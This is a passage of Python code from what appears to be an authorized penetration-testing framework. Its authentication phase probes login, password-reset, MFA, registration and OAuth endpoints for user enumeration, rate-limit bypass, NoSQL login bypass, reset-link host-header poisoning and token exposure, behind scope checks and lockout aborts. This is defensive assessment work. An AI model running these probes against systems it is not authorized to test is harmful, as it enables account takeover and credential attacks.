    _w_json("csrf_binding.json", results.get("csrf_report") or {})
    _w_json("user_enumeration.json", results.get("enum_report") or {})
    _w_json("auth_enum_ladder.json", results.get("enum_ladder") or {})
    _w_json("rate_limit_report.json", results.get("rl_report") or {})
    _w_json("auth_bypass2_matrix.json", results.get("bypass2") or {})
    _w_json("reset_flow_analysis.json", results.get("reset_report") or {})
    _w_json("mfa_analysis.json", results.get("mfa_report") or {})
    _w_json("auth_mfa_deep.json", results.get("mfa_deep") or {})
    _w_json("registration_analysis.json", results.get("reg_report") or {})
    _w_json("oauth_analysis.json", results.get("oauth_report") or {})
    _w_json("auth_oauth_deep.json", results.get("oauth_deep") or {})
    _w_json("auth_oauth_variants.json", results.get("oauth_variants") or {})
    _w_json("auth_oauth_errshape.json", results.get("oauth_err") or {})
    _w_json("saml_surface.json", results.get("saml_report") or {})
    _w_json("auth_saml_deep.json", results.get("saml_deep") or {})
    _w_json("auth_authz_matrix.json", results.get("authz_matrix") or {})
    _w_json("auth_header_trust.json", results.get("header_trust") or {})
    _w_json("auth_cors.json", results.get("cors_report") or {})
    _w_json("auth_redirect_xss.json", results.get("redir_report") or {})
    _w_json("injection_oracle.json", results.get("inj_report") or {})
    _w_json("cookie_flags.json", results.get("cookie_report") or {})
    _w_json("preauth_jwt.json", {"tokens": results.get("jwt_report") or [],
                                 "tamper_probe":
                                     results.get("tamper_results") or {},
                                 "deep": results.get("jwt_deep") or {}})
    _w_json("auth_lifecycle.json", results.get("lifecycle") or {})
    _w_json("auth_policy_captcha.json", results.get("policy_captcha") or {})
    _w_json("auth_http_hardening.json", results.get("hard_report") or {})
    # ---- v23 Stage W/X/Y/Z artifacts ----
    _w_json("auth_pwd_hygiene.json", results.get("pwd_hygiene") or {})
    _w_json("auth_stuffing_posture.json",
            results.get("stuffing_posture") or {})
    _w_json("auth_rememberme.json", results.get("rememberme") or {})
    _w_json("auth_session_props.json", results.get("session_props") or {})
    _w_json("auth_recovery.json", results.get("recovery") or {})
    _w_json("auth_login_sequence.json", results.get("login_sequence") or {})
    _w_json("auth_sso_grants.json", results.get("sso_grants") or {})
    _w_json("auth_token_binding.json", results.get("token_binding") or {})
    _w_json("auth_header_posture.json", results.get("header_posture") or {})
    _w_json("auth_defense_score.json", results.get("defense_score") or {})
    _w_json("auth_privileged_targets.json",
            {"targets": results.get("privileged_targets") or [],
             "source": "P20 ff + P11 ff + P7 hints"})
    _w_json("auth_verdicts.json", {
        "plan_version": PLAN_VERSION, "ladder": ["CONFIRMED", "SUSPECTED",
                                                 "HARDENED", "NOISE", "INFO",
                                                 "GATED"],
        "rows": results.get("verdict_rows") or []})
    _w_json("auth_kill_chains.json", {
        "plan_version": PLAN_VERSION, "count": len(results.get("chains") or []),
        "chains": results.get("chains") or [],
        "crossref": results.get("chains_crossref") or []})
    if results.get("chains"):
        _w_text("auth_kill_chains.txt", "\n".join(
            "%s %-28s %-10s %-6s %s" % (c["id"], c["name"], c["verdict"],
                                        c["completeness"], c["impact"])
            for c in results["chains"]))
    matrix = build_technique_matrix(results, conf)
    _w_json("auth_matrix.json", {"plan_version": PLAN_VERSION,
                                 "rows": len(matrix),
                                 "families": _FAMS,
                                 "items": matrix})
    _w_text("AUTH_MATRIX.txt", _matrix_txt(matrix))
    _w_json("auth_hypotheses.json", {"hypotheses": ctx.get("hypotheses") or []})
    _w_json("findings.json", {"phase": PHASE, "plan_version": PLAN_VERSION,
                              "count": len(F.items), "items": F.items})
    _w_text("AUTH_FINDINGS.md", _findings_md(scope, F, ctx, meta, results))
    _w_text("auth_test_plan.md", _test_plan_md(results,
                                               results.get("verdict_rows")
                                               or [], conf))
    _w_text("auth_remediation.txt", _remediation_txt(
        results.get("verdict_rows") or []))
    _w_text("auth_kickoff_guide.md", _kickoff_md(results, conf))
    if conf.get("auth_exec_summary", True):
        _w_text("auth_exec_summary.md", _exec_md(scope, F, ctx, meta,
                                                 results, conf))
    _w_json("auth_playbooks.json", {
        "execution": "FORBIDDEN (manual+RoE wave only)",
        "mfa": [{"name": n, "playbook": d} for n, d in
                DOCUMENTED_MFA_TECHNIQUES],
        "saml": [{"name": n, "playbook": d} for n, d in
                 DOCUMENTED_SAML_TECHNIQUES],
        "oauth": [{"name": n, "playbook": d} for n, d in
                  DOCUMENTED_OAUTH_TECHNIQUES],
        "jwt": [{"name": n, "playbook": d} for n, d in
                DOCUMENTED_JWT_TECHNIQUES]})
    _w_text("auth_playbooks.md", _kickoff_md(results, conf))
    if ctx.get("state_machine"):
        _w_text("auth_state_machine.md", ctx["state_machine"])
    _w_json("auth_coverage.json", ctx.get("coverage") or {})
    _w_json("auth_stats.json", {"stats_summary": ctx.get("stats_summary")
                                or {}, "probes": meta.get("probes_total", 0),
                                "mode": "passive" if ctx.get("passive")
                                else "active",
                                "duration_s": round(meta.get("duration", 0.0), 1)})
    # ---- feedforward (P22/P23/P25/P11/P12/P9) ----
    vr = results.get("verdict_rows") or []
    ff_map = {
        "to_phase22_replay": {
            "rate_limit_primitives": [r.get("target") for r in vr
                                      if r.get("key") == "no_rate_limit"][:6],
            "bypass2_wins": [r.get("target") for r in
                             (results.get("bypass2") or {}).get("rows", [])
                             if r.get("nontrivial")][:6]},
        "to_phase23_misconfig": {
            "oauth_flags": [r.get("key") for r in vr
                            if r.get("key", "").startswith("oauth_")][:8],
            "header_trust_flags": [r.get("key") for r in vr
                                   if r.get("key", "").startswith("header_")][:6],
            "v22_auth_flags": {
                "cors_reflection": [u for u, r in
                                    (results.get("cors_report") or {}).items()
                                    if r.get("reflected")][:4],
                "saml_metadata_open": [r.get("url") for r in
                                       (results.get("saml_deep") or {})
                                       .get("rows", [])
                                       if r.get("metadata_open")][:4]},
            "v23_misconfig_flags": {
                "sso_grant_risks": [r.get("source") for r in
                                    (results.get("sso_grants") or {})
                                    .get("rows", [])
                                    if r.get("risk_flags")][:4],
                "header_posture_weak": [r.get("url") for r in
                                        (results.get("header_posture") or {})
                                        .get("rows", [])
                                        if r.get("verdict") == "WEAK"][:6]}},
        "to_phase25_controls": {
            "captcha_gaps": [r.get("url") for r in
                             (results.get("policy_captcha") or {})
                             .get("anti_auto", [])][:6],
            "lockout_model": [r.get("key") for r in vr
                              if str(r.get("key", "")).startswith(
                                  "lockout_model_")][:6],
            "waf_blind": bool(results.get("waf_seen")),
            "v23_stuffing_posture": {
                "open": [r.get("url") for r in
                         (results.get("stuffing_posture") or {})
                         .get("rows", [])
                         if r.get("verdict") == "OPEN"][:4],
                "partial": [r.get("url") for r in
                            (results.get("stuffing_posture") or {})
                            .get("rows", [])
                            if r.get("verdict") == "PARTIAL"][:4]}},
        "to_phase11_idor": {
            "authz_horizontal": [r.get("url") for r in
                                 (results.get("authz_matrix") or {})
                                 .get("horizontal", [])
                                 if r.get("verdict") in ("CONFIRMED",
                                                         "SUSPECTED")][:6],
            "id_paths": [t for t in
                         (results.get("privileged_targets") or [])[:6]]},
        "to_phase12_inject": {
            "nosql_accepted": [u for u, r in
                               (results.get("inj_report") or {}).items()
                               if r.get("nosql_accepted")][:4],
            "type_confusion": [u for u, r in
                               (results.get("inj_report") or {}).items()
                               if r.get("type_confusion")][:4]},
        "to_phase9_sessions": {
            "cookie_flags": [u for u, c in
                             (results.get("cookie_report") or {}).items()
                             if any(x.get("missing") for x in
                                    (c if isinstance(c, list) else []))][:6],
            "remember_predictable": [r.get("host") for r in
                                     (results.get("lifecycle") or {})
                                     .get("remember_me", [])
                                     if r.get("verdict") == "SUSPECTED"][:4],
            "v23_session_gaps": [r.get("endpoint") for r in
                                 (results.get("session_props") or {})
                                 .get("rows", [])
                                 if r.get("verdict") == "SUSPECTED"][:6],
            "v23_rememberme_persist": [r.get("host") for r in
                                       (results.get("rememberme") or {})
                                       .get("rows", [])
                                       if r.get("verdict") ==
                                       "SUSPECTED"][:4]}}
    ff = write_feedforward(out, PHASE, ff_map, notes=[
        "P21 v23 INERT census complete",
        "gates: authz_matrix=%s oauth_variants=%s bypass2=%s "
        "rememberme=%s recovery=%s sequence=%s binding=%s" % (
            bool((results.get("authz_matrix") or {}).get("ran")),
            bool((results.get("oauth_variants") or {}).get("ran")),
            bool((results.get("bypass2") or {}).get("ran")),
            bool((results.get("rememberme") or {}).get("gated")),
            bool((results.get("recovery") or {}).get("gated")),
            bool((results.get("login_sequence") or {}).get("gated")),
            bool((results.get("token_binding") or {}).get("gated")))])
    manifest.append("feedforward.json")
    _w_json("auth_feedforward.json", ff)
    # ---- manifest ----
    stats = {"phase": PHASE, "plan_version": PLAN_VERSION,
             "findings": len(F.items), "probes": meta.get("probes_total", 0),
             "artifacts": len(manifest) + 3,
             "matrix_rows": len(matrix),
             "chains": len(results.get("chains") or []),
             "verdict_rows": len(vr),
             "mode": "passive" if ctx.get("passive") else "active"}
    write_manifest(out, PHASE, manifest, stats=stats, notes=[
        "100% INERT detection-only", "RoE gates default OFF",
        "canary family: %s" % CANARY])
    manifest += ["MANIFEST.json", "feedforward.json", "auth_feedforward.json"]
    return manifest


# ===========================================================================
# P21 RUN - v23 FINAL ULTRA PRO MAX orchestration (stages A..Z)
# ===========================================================================
def run(cfg, scope, base_dir):
    t_start = time.time()
    out, ev, http, cp = module_ctx(cfg, scope, base_dir, NAME)
    http = _ensure_read_only_support(http)
    conf = dict(DEFAULTS)
    for k in list(conf.keys()):
        if hasattr(cfg, k):
            conf[k] = getattr(cfg, k)

    head("Phase 21 - Authentication & Authorization (v%s) | %s"
         % (PLAN_VERSION, scope.describe()))
    ACTIVE = bool(getattr(cfg, "allow_active", True))
    if not ACTIVE:
        warn("allow_active=False -> DISCOVERY + PASSIVE-ONLY mode: enum/"
             "rate-limit/reset/MFA/injection/redirect/oauth-variant probes "
             "sab skip honge (koi login attempt nahi).")
    assert_auth_inert(http)

    F = Findings()
    meta = {"probes_total": 0}
    results = {}
    ctx = {"live": {}, "hypotheses": [], "coverage": {}, "stats_summary": {},
           "aborted": False, "passive": not ACTIVE}

    # ---------------- Stage A: feedforward + surface discovery ----------------
    head("Stage A - Feedforward (18-module) + auth surface discovery")
    ff = read_feedforward_safe(os.path.join(base_dir, scope.engagement))
    results["ff"] = ff
    p21_hits = bool(_deep_get(ff, "logic", "to_phase21_authz") or
                    _deep_get(ff, "access", "to_phase21_authz"))
    ok("feedforward seeds: %d modules | P20/P21 authz feed: %s"
       % (len(ff), "YES" if p21_hits else "no"))
    key = "stageA:discovery"
    if cp.is_done(key):
        ranked = cp.result_of(key) or []
        ok("Replayed %d candidates (checkpoint)" % len(ranked))
    else:
        ranked = discover_auth_surface(base_dir, scope, out, conf)
        cp.mark(key, ranked, summary="auth candidates")
    if not ranked:
        err("Koi auth candidate nahi mila. Phase 2-8 pehle chalao, ya "
            "scope.json me target add karo.")
        ctx["coverage"]["auth_surface"] = "NOT-FOUND"
        results.update({"ranked": [], "probes": {}, "buckets": {},
                        "live": {}, "verdict_rows": [], "chains": []})
        write_reports(out, scope, F, ctx, meta, results, conf)
        return out
    ok("%d auth candidate endpoints (priority order me)" % len(ranked))
    results["ranked"] = ranked
    info("P20 logic_privileged_targets + P11/P7 feed: %d privileged targets"
         % len(privileged_targets_from_ff(base_dir, scope, results)))

    # ---------------- Stage B: probe & flow mapping (read-only) ----------------
    head("Stage B - Probe & auth-flow mapping (read-only) + buckets")
    probes = {}
    for i, r in enumerate(ranked, 1):
        u = r["url"]
        ck = "probe:" + u
        if cp.is_done(ck):
            probes[u] = cp.result_of(ck) or {}
            continue
        rec = probe_endpoint(http, u, conf)
        rec["phase8"] = {"priority": r.get("priority"),
                         "classes": r.get("classes"),
                         "confidence": r.get("confidence"),
                         "why": r.get("why")}
        probes[u] = rec
        cp.mark(ck, rec, summary="probe")
        if rec.get("status"):
            ok("[%d/%d] %s -> %s forms=%d csrf=%s" % (
                i, len(ranked), u, rec["status"], len(rec.get("forms") or []),
                rec.get("csrf_present")))
        else:
            warn("[%d/%d] %s -> %s" % (i, len(ranked), u, rec.get("error")))
        if cp.is_done("__abort__"):
            break
    dead = [u for u, r in probes.items() if r.get("status") and
            r["status"] >= 400]
    live = {u: r for u, r in probes.items() if r.get("status") and
            r["status"] < 400}
    if dead:
        info("%d dead/error endpoints buckets se hata diye (status>=400)"
             % len(dead))
    ok("%d/%d endpoints LIVE (status<400)" % (len(live), len(ranked)))
    ctx["live"] = live
    ctx["live_count"] = len(live)
    results["probes"] = probes
    results["live"] = live

    login_eps = [u for u, r in live.items()
                 if r.get("has_password") or
                 LOGIN_HINT_RE.search(urllib.parse.urlparse(u).path)]
    reset_eps = [u for u, r in live.items()
                 if RESET_HINT_RE.search(urllib.parse.urlparse(u).path)]
    mfa_eps = [u for u, r in live.items()
               if MFA_HINT_RE.search(urllib.parse.urlparse(u).path)]
    reg_eps = [u for u, r in live.items()
               if REGISTER_HINT_RE.search(urllib.parse.urlparse(u).path)
               or r.get("register_form")]
    oauth_eps = [u for u, r in live.items()
                 if OAUTH_HINT_RE.search(urllib.parse.urlparse(u).path)]
    buckets = {"login": login_eps, "reset": reset_eps, "mfa": mfa_eps,
               "register": reg_eps, "oauth": oauth_eps}
    results["buckets"] = buckets
    info("buckets: login=%d reset=%d mfa=%d register=%d oauth=%d" % (
        len(login_eps), len(reset_eps), len(mfa_eps), len(reg_eps),
        len(oauth_eps)))

    # param census (oauth/authz shapes, 0 extra requests)
    param_census = []
    for u in list(live)[:20]:
        shape = mine_oauth_params(u)
        az = classify_authz_path(path_only(u))
        if shape or az.get("privileged_shape"):
            param_census.append({"target": u, "oauth_params": shape,
                                 "authz_shape": az.get("shape"),
                                 "privileged": az.get("privileged_shape")})
    results["param_census"] = param_census
    if param_census:
        ok("param/authz census: %d shape rows" % len(param_census))

    # passive findings (0 extra requests)
    wp_hit, na_hit, wa_hit = False, False, False
    for u, r in live.items():
        path_u = urllib.parse.urlparse(u).path
        if not wp_hit and r.get("wp_users"):
            F.add("wordpress_users_exposed",
                  "WP REST users endpoint usernames dump karta hai", u,
                  "/wp-json/wp/v2/users 200 + JSON list - enumeration feed.",
                  evidence_ref="auth_surface.json")
            wp_hit = True
        if not na_hit and NEXTAUTH_PATH_RE.search(path_u) and \
                "providers" in path_u:
            F.add("nextauth_surface", "NextAuth/Auth.js provider endpoint "
                  "exposed", u,
                  "/api/auth/providers reachable - SSO providers disclose "
                  "hote hain.", evidence_ref="auth_surface.json")
            na_hit = True
        if not wa_hit and r.get("webauthn"):
            F.add("webauthn_detected", "WebAuthn/passkey flows detect hue", u,
                  "Auth page me webauthn/credentials API markers mile.",
                  evidence_ref="auth_surface.json")
            wa_hit = True
        if r.get("token_in_url"):
            F.add("token_in_url_transport",
                  "Auth token URL query me transport hota hai", u,
                  "token/jwt/access_token query param mila - Referer/logs/"
                  "browser-history leak risk.", evidence_ref="auth_surface.json")
    for u in login_eps:
        if _is_cleartext(u):
            F.add("cleartext_auth_transport",
                  "Login endpoint HTTP par hai (cleartext)", u,
                  "Credentials plaintext me network par jaayenge.",
                  evidence_ref="auth_surface.json")
    for u, r in live.items():
        if r.get("debug_leak"):
            F.add("sensitive_error_disclosure",
                  "Auth endpoint stack trace / debug info leak karta hai", u,
                  "Response me debug signature mila.",
                  evidence_ref="auth_surface.json")
        wa = (r.get("www_authenticate") or "").lower()
        if wa and ("basic" in wa or "ntlm" in wa):
            F.add("weak_auth_scheme", "Weak HTTP auth scheme expose hua", u,
                  "WWW-Authenticate: %s" % r.get("www_authenticate"),
                  evidence_ref="http_auth_schemes.json")

    # ---------------- Stage C: CSRF binding (v10 engine) ----------------
    head("Stage C - CSRF token binding test")
    csrf_report = {}
    for u in [x for x in login_eps + reg_eps
              if (live.get(x, {}).get("csrf_present"))][:3]:
        ck = "csrf:" + u
        if cp.is_done(ck):
            csrf_report[u] = cp.result_of(ck) or {}
            continue
        res = csrf_token_binding(http, scope, u, live[u], conf)
        csrf_report[u] = res
        cp.mark(ck, res, summary="csrf binding")
        if res.get("static"):
            F.add("csrf_token_static", "CSRF token session-bound nahi hai", u,
                  res.get("summary", ""), evidence_ref="csrf_binding.json")
    for u in login_eps + reg_eps:
        r = live.get(u, {})
        if r.get("status") and r.get("forms") and not r.get("csrf_present"):
            if r.get("has_password"):
                F.add("csrf_missing", "Auth form me CSRF token nahi mila", u,
                      "Form mila par koi csrf/xsrf/_token field nahi tha.",
                      evidence_ref="auth_surface.json")
    results["csrf_report"] = csrf_report

    # ---------------- Stage D: enumeration + v22 ladder ----------------
    head("Stage D - User enumeration (DRF-v2 + JSON oracle + robust timing "
         "+ v22 ladder)")
    enum_report = {"endpoints": {},
                   "heuristic_enabled": conf["auth_allow_heuristic_enum"],
                   "stats_method": "welch+mannwhitney+cliffsdelta+bootstrap"}
    if conf["auth_allow_heuristic_enum"] and ACTIVE and \
            not cp.is_done("__abort__"):
        for u in login_eps[:3]:
            ck = "enum:" + u
            if cp.is_done(ck):
                res = cp.result_of(ck) or {}
                ok("SKIP enum (done) %s" % u)
            else:
                res = enum_login_endpoint(http, scope, u, live[u], conf)
                cp.mark(ck, res, summary="enum")
            enum_report["endpoints"][u] = res
            if res.get("locked_out"):
                warn("Enumeration ke dauraan lockout -> aage ke active "
                     "stages band")
                cp.mark("__abort__", {"reason": "lockout", "stage": "enum"},
                        summary="abort")
                ctx["aborted"] = True
                break
            if res.get("enumeration_likely"):
                F.add("user_enumeration",
                      "User enumeration (response differential)", u,
                      res.get("summary", ""),
                      evidence_ref="user_enumeration.json",
                      extra={"signals": res.get("enumeration_signals")})
            if (res.get("timing") or {}).get("timing_anomaly"):
                F.add("timing_enumeration",
                      "Timing-based user enumeration", u,
                      json.dumps(res.get("timing"), default=str)[:300],
                      evidence_ref="user_enumeration.json")
            if (res.get("signals") or {}).get("json_oracle"):
                F.add("json_oracle_enumeration",
                      "JSON error-code oracle se enumeration", u,
                      json.dumps(res["signals"]["json_oracle"],
                                 default=str)[:300],
                      evidence_ref="user_enumeration.json")
    elif not conf["auth_allow_heuristic_enum"]:
        info("Heuristic enumeration config se disabled hai.")
    results["enum_report"] = enum_report
    enum_ladder = enum_oracle_classify(
        list(enum_report.get("endpoints", {}).values()), conf)
    results["enum_ladder"] = enum_ladder
    if enum_ladder.get("confirmed_shapes"):
        ok("enum ladder shapes: %s" % json.dumps(
            enum_ladder["confirmed_shapes"], default=str))

    # ---------------- Stage E: injection / type oracle ----------------
    head("Stage E - Injection / type-confusion oracle (NoSQL, HPP, CT)")
    inj_report = {}
    if not cp.is_done("__abort__") and ACTIVE and \
            conf.get("auth_allow_injection_oracle", True) and login_eps:
        for u in login_eps[:2]:
            ck = "inj:" + u
            if cp.is_done(ck):
                res = cp.result_of(ck) or {}
                ok("SKIP injection oracle (done) %s" % u)
            else:
                res = injection_oracle(http, scope, u, live[u], conf)
                cp.mark(ck, res, summary="injection oracle")
            inj_report[u] = res
            if res.get("nosql_accepted"):
                F.add("nosql_operator_accepted",
                      "NoSQL operator login bypass candidate", u,
                      res.get("summary", ""),
                      evidence_ref="injection_oracle.json",
                      extra={"note": "confirm manual me karo - sirf ek "
                              "bounded probe bheja gaya"})
                warn("NoSQL operator ACCEPT hua %s -> manual confirm karo "
                     "(Critical candidate)" % u)
            if res.get("type_confusion"):
                F.add("json_type_confusion_signal",
                      "JSON type confusion par behaviour badalta hai", u,
                      res.get("summary", ""),
                      evidence_ref="injection_oracle.json")
            if res.get("hpp_diff"):
                F.add("hpp_response_diff",
                      "Parameter pollution se response differential", u,
                      res.get("summary", ""),
                      evidence_ref="injection_oracle.json")
            if res.get("content_type_diff"):
                F.add("content_type_behavior_diff",
                      "Form vs JSON body par alag behaviour", u,
                      res.get("summary", ""),
                      evidence_ref="injection_oracle.json")
            if cp.is_done("__abort__"):
                break
    elif not ACTIVE:
        info("Injection oracle skip (allow_active=False).")
    results["inj_report"] = inj_report

    # ---------------- Stage F: rate-limit + lockout + bypass2 ----------------
    head("Stage F - Rate-limit, lockout model, bypass matrix + bypass2 (17)")
    rl_report = {}
    if not cp.is_done("__abort__") and ACTIVE:
        for u in login_eps[:3]:
            ck = "ratelimit:" + u
            if cp.is_done(ck):
                res = cp.result_of(ck) or {}
                ok("SKIP rate-limit (done) %s" % u)
            else:
                res = rate_limit_probe(http, scope, u, live[u], conf)
                if res.get("throttled") and \
                        int(conf["auth_bypass_probes"]) > 0:
                    res["bypass_matrix"] = rate_limit_bypass_matrix(
                        http, scope, u, live[u], conf)
                cp.mark(ck, res, summary="rate-limit")
            if (res.get("bypass_matrix") or {}).get("bypass_likely"):
                F.add("lockout_bypass",
                      "Rate-limit/lockout bypassable (%s)" %
                      res["bypass_matrix"].get("bypass_type"), u,
                      res["bypass_matrix"].get("summary", ""),
                      evidence_ref="rate_limit_report.json")
            if not res.get("throttled"):
                F.add("no_rate_limit",
                      "Auth endpoint par effective rate limiting nahi", u,
                      res.get("summary", ""),
                      evidence_ref="rate_limit_report.json")
            rl_report[u] = res
            if res.get("locked_out"):
                warn("Lockout sentinel tripped -> active stages halt")
                cp.mark("__abort__", {"reason": "lockout",
                                      "stage": "ratelimit"}, summary="abort")
                ctx["aborted"] = True
                break
    else:
        if ACTIVE:
            warn("Active stages skip (pehle lockout sentinel laga tha).")
        else:
            info("Rate-limit stage skip (passive-only mode).")
    results["rl_report"] = rl_report
    bypass2 = {}
    if not cp.is_done("__abort__") and ACTIVE and login_eps:
        bypass2 = bypass2_auth_census(http, scope, login_eps[0],
                                      live.get(login_eps[0], {}), meta, conf)
        for r in bypass2.get("rows", []):
            r["target"] = login_eps[0]
        if bypass2.get("ran"):
            wins = [r["variant"] for r in bypass2.get("rows", [])
                    if r.get("nontrivial")]
            if wins:
                F.add("bypass2_shape_win",
                      "Request-shape differential rate-limit census me mila",
                      login_eps[0], "variants=%s" % ",".join(wins[:5]),
                      evidence_ref="auth_bypass2_matrix.json")
                warn("bypass2 win: %s (confirm manual me karo)" % wins[0])
    results["bypass2"] = bypass2


    # ---------------- Stage G: reset flow ----------------
    head("Stage G - Password reset flow analysis")
    reset_report = {}
    if not cp.is_done("__abort__") and conf["auth_allow_reset_probe"] and ACTIVE:
        for u in reset_eps[:4]:
            ck = "reset:" + u
            if cp.is_done(ck):
                res = cp.result_of(ck) or {}
                ok("SKIP reset (done) %s" % u)
            else:
                res = reset_flow_analysis(http, scope, u, live[u], conf)
                cp.mark(ck, res, summary="reset flow")
            reset_report[u] = res
            if (res.get("token") or {}).get("weak"):
                F.add("reset_token_weak",
                      "Weak / predictable password-reset token", u,
                      json.dumps(res["token"], default=str)[:400],
                      evidence_ref="reset_flow_analysis.json")
            if res.get("host_header_reflected"):
                F.add("reset_host_header_injection",
                      "Host header reset link me inject hota hai", u,
                      "Injected host response body/Location me reflect hua.",
                      evidence_ref="reset_flow_analysis.json")
            if res.get("header_variants"):
                F.add("reset_header_poison_extended",
                      "Reset link alternate header se bhi poison hua "
                      "(X-Original-URL/Proto)", u,
                      "variants=%s" % json.dumps(res["header_variants"],
                                                 default=str)[:300],
                      evidence_ref="reset_flow_analysis.json")
            if res.get("token_in_response"):
                F.add("reset_token_disclosure",
                      "Password-reset token HTTP response me disclose hua", u,
                      "Reset POST ke response body me token-shaped value mili.",
                      evidence_ref="reset_flow_analysis.json")
            if res.get("enumeration_likely"):
                F.add("reset_enumeration",
                      "Reset endpoint account existence leak karta hai", u,
                      res.get("summary", ""),
                      evidence_ref="reset_flow_analysis.json")
    elif not conf["auth_allow_reset_probe"]:
        info("Reset probing config se disabled hai.")
    results["reset_report"] = reset_report

    # ---------------- Stage H: MFA + v22 deep ----------------
    head("Stage H - MFA / OTP flow analysis + v22 deep census")
    mfa_report = {}
    if not cp.is_done("__abort__") and ACTIVE:
        for u in mfa_eps[:4]:
            ck = "mfa:" + u
            if cp.is_done(ck):
                res = cp.result_of(ck) or {}
                ok("SKIP mfa (done) %s" % u)
            else:
                res = mfa_flow_analysis(http, scope, u, live[u], conf)
                cp.mark(ck, res, summary="mfa flow")
            mfa_report[u] = res
            if res.get("status_oracle") or res.get("json_oracle"):
                F.add("mfa_status_oracle",
                      "MFA verify endpoint state leak karta hai", u,
                      res.get("summary", ""), evidence_ref="mfa_analysis.json")
            if res.get("no_ratelimit"):
                F.add("mfa_no_ratelimit",
                      "OTP verification par rate limit nahi", u,
                      res.get("summary", ""), evidence_ref="mfa_analysis.json")
            if res.get("weak_otp_policy"):
                F.add("mfa_weak_otp_policy",
                      "OTP policy kamzor (chhota length)", u,
                      json.dumps(res.get("otp_shape"), default=str)[:250],
                      evidence_ref="mfa_analysis.json")
            if res.get("locked_out"):
                cp.mark("__abort__", {"reason": "lockout", "stage": "mfa"},
                        summary="abort")
                ctx["aborted"] = True
                break
    results["mfa_report"] = mfa_report
    mfa_deep = mfa_deep_census(mfa_report, meta, conf)
    results["mfa_deep"] = mfa_deep

    # ---------------- Stage I: registration + pre-ATO (gated) ----------------
    head("Stage I - Registration flow analysis (+ pre-account-takeover "
         "shape, gated)")
    reg_report = {}
    for u in reg_eps[:3]:
        ck = "reg:" + u
        if cp.is_done(ck):
            res = cp.result_of(ck) or {}
            ok("SKIP register (done) %s" % u)
        else:
            res = registration_analysis(http, scope, u, live[u], conf)
            cp.mark(ck, res, summary="register")
        reg_report[u] = res
        if res.get("enumeration_likely"):
            F.add("registration_enumeration",
                  "Registration account existence leak karta hai", u,
                  res.get("summary", ""),
                  evidence_ref="registration_analysis.json")
        if (res.get("static") or {}).get("policy_hint", {}).get("weak_hint"):
            F.add("password_policy_weak",
                  "Client-side password policy kamzor", u,
                  json.dumps(res["static"]["policy_hint"],
                             default=str)[:250],
                  evidence_ref="registration_analysis.json")
        if res.get("open_registration"):
            F.add("registration_open", "Registration khula hai", u,
                  "Public signup enabled - attack surface note karo.",
                  evidence_ref="registration_analysis.json")
    pretakeover = {"gated": True, "ran": False, "rows": []}
    if conf.get("auth_allow_pretakeover_probe", False) and ACTIVE and reg_eps:
        pretakeover["ran"] = True
        pretakeover["note"] = ("canary duplicate-registration oracle - "
                               "hard cap 2 requests, sequential")
        u = reg_eps[0]
        meta["probes_total"] = meta.get("probes_total", 0) + 2
        for i in range(2):
            try:
                r = http.request("POST", u,
                                 data={"email": CANARY_EMAIL,
                                       "username": CANARY,
                                       "password": _canary("pw")},
                                 allow_redirects=False, read_only_post=True)
            except Exception:
                continue
            if r is None:
                continue
            shape = _json_error_shape(r.text or "")
            pretakeover["rows"].append({
                "attempt": i + 1, "status": r.status, "shape": shape,
                "verdict": "CONFIRMED" if (i == 1 and
                                           ("already" in (r.text or "")[:600]
                                            .lower() or
                                            r.status in (409, 422, 400)))
                else "NOISE"})
        for r in pretakeover["rows"]:
            if r.get("verdict") == "CONFIRMED":
                F.add("pretakeover_shape",
                      "Duplicate canary registration accepted + leak shape",
                      reg_eps[0],
                      "pre-account-takeover shape - RoE gated census",
                      evidence_ref="registration_analysis.json")
    else:
        pretakeover["note"] = ("RoE gate OFF (auth_allow_pretakeover_probe) "
                               "-> documented-only playbook")
    results["reg_report"] = reg_report
    results["pretakeover"] = pretakeover

    # ---------------- Stage J: OAuth/OIDC deep ----------------
    head("Stage J - OAuth/OIDC discovery + deep census (PKCE/state/nonce/"
         "id_token/jwks)")
    oauth_report = {}
    saml_report = {}
    oidc = [u for u in live
            if "openid-configuration" in u or "oauth-authorization-server" in u]
    if oidc:
        ck = "oauth:discovery"
        if cp.is_done(ck):
            oauth_report = cp.result_of(ck) or {}
            ok("SKIP oauth discovery (done)")
        else:
            oauth_report = oauth_discovery(http, scope, oidc, conf)
            cp.mark(ck, oauth_report, summary="oauth discovery")
        if oauth_report.get("redirect_uri_loose"):
            F.add("oauth_redirect_uri_loose",
                  "OAuth redirect_uri validation permissive lag rahi hai",
                  ", ".join(oidc), oauth_report.get("summary", ""),
                  evidence_ref="oauth_analysis.json")
        if oauth_report.get("no_pkce"):
            F.add("oauth_no_pkce", "OIDC provider PKCE support nahi karta",
                  ", ".join(oidc), oauth_report.get("summary", ""),
                  evidence_ref="oauth_analysis.json")
        if oauth_report.get("implicit_flow"):
            F.add("oauth_implicit_flow", "Implicit flow enabled hai",
                  ", ".join(oidc), oauth_report.get("summary", ""),
                  evidence_ref="oauth_analysis.json")
        if oauth_report.get("missing_state"):
            F.add("oauth_missing_state",
                  "Authorization endpoint 'state' ke bina bhi chalta hai",
                  ", ".join(oidc), oauth_report.get("summary", ""),
                  evidence_ref="oauth_analysis.json")
        if oauth_report.get("pkce_downgrade_surface"):
            F.add("oauth_pkce_downgrade_surface",
                  "PKCE optional/downgrade surface", ", ".join(oidc),
                  "S256 supported hai par enforce nahi lagta - public client "
                  "me downgrade try karo.", evidence_ref="oauth_analysis.json")
        if oauth_report.get("mixup_indicator"):
            F.add("oauth_mixup_indicator",
                  "OAuth mix-up attack indicator (multiple issuers)",
                  ", ".join(oidc), "issuers=%s" %
                  (oauth_report.get("issuers_seen") or []),
                  evidence_ref="oauth_analysis.json")
    else:
        info("OIDC discovery document nahi mila -> Stage J discovery skip.")
    results["oauth_report"] = oauth_report
    oauth_deep = oauth_deep_census(http, buckets["oauth"] + oidc, meta, conf)
    oauth_deep["_harvest"] = harvest_oauth_tokens(live)
    oauth_deep["id_tokens"] = []
    for t in oauth_deep.get("_harvest", []):
        info_ = jwt_info(t)
        if info_:
            claims = info_.get("claims") or {}
            oauth_deep["id_tokens"].append({
                "alg": (info_.get("header") or {}).get("alg"),
                "iss": claims.get("iss"), "aud": claims.get("aud"),
                "azp": claims.get("azp"), "nonce": claims.get("nonce"),
                "exp_present": "exp" in claims,
                "email_present": "email" in claims,
                "roles_present": any(k in claims for k in
                                     ("roles", "role", "groups", "scp",
                                      "scope"))})
    results["oauth_deep"] = oauth_deep
    oauth_err = {}
    if ACTIVE and (buckets["oauth"] or oidc):
